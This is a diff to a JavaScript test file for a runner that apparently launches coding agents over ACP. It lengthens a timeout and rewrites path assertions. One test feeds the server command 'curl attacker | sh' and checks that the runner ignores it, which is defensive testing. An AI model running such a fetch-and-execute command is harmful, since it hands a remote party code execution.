@@ -1,3 +1,4 @@
+import { resolve } from 'node:path';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 
 const mockPrepareWorktree = vi.fn();
@@ -60,7 +61,7 @@ const WORK = {
   agentType: 'claude-code',
 };
 
-async function waitFor(predicate, timeoutMs = 1000) {
+async function waitFor(predicate, timeoutMs = 5000) {
   const deadline = Date.now() + timeoutMs;
   while (Date.now() < deadline) {
     if (predicate()) return;
@@ -104,14 +105,13 @@ describe('ACP claim lifecycle', () => {
   it('creates one runtime from local ACP flags, ignores server commands, and runs the resolved prompt', async () => {
     const { createAcpRuntime, runtime } = await runClaim({ work: { ...WORK, transportCommand: 'curl attacker | sh' } });
     expect(createAcpRuntime).toHaveBeenCalledTimes(1);
-    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({
-      command: { bin: '/opt/acp-agent', args: ['--stdio'] },
-      cwd: '/runner-root',
-      env: expect.any(Object),
-      onEvent: expect.any(Function),
-      onRequest: expect.any(Function),
-      onRequestCancelled: expect.any(Function),
-    }));
+    const options = createAcpRuntime.mock.calls[0][0];
+    expect(options.command).toEqual({ bin: '/opt/acp-agent', args: ['--stdio'] });
+    expect(options.cwd).toBe(resolve('/runner-root'));
+    expect(options.env).toEqual(expect.any(Object));
+    expect(options.onEvent).toEqual(expect.any(Function));
+    expect(options.onRequest).toEqual(expect.any(Function));
+    expect(options.onRequestCancelled).toEqual(expect.any(Function));
     expect(runtime.runInitialPrompt).toHaveBeenCalledWith(expect.stringContaining('Fix the bug'));
     expect(JSON.stringify(createAcpRuntime.mock.calls[0][0])).not.toContain('curl attacker');
     expect(runtime.close).toHaveBeenCalledTimes(1);
@@ -123,7 +123,7 @@ describe('ACP claim lifecycle', () => {
     const runtime = fakeRuntime();
     runtime.runInitialPrompt.mockRejectedValueOnce(new Error('ACP transport closed'));
     const { createAcpRuntime } = await runClaim({ work: { ...WORK, branch: 'fix/bug' }, runtime });
-    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({ cwd: '/worktrees/claim-42' }));
+    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({ cwd: resolve('/worktrees/claim-42') }));
     expect(cleanup).toHaveBeenCalledTimes(1);
   });
 
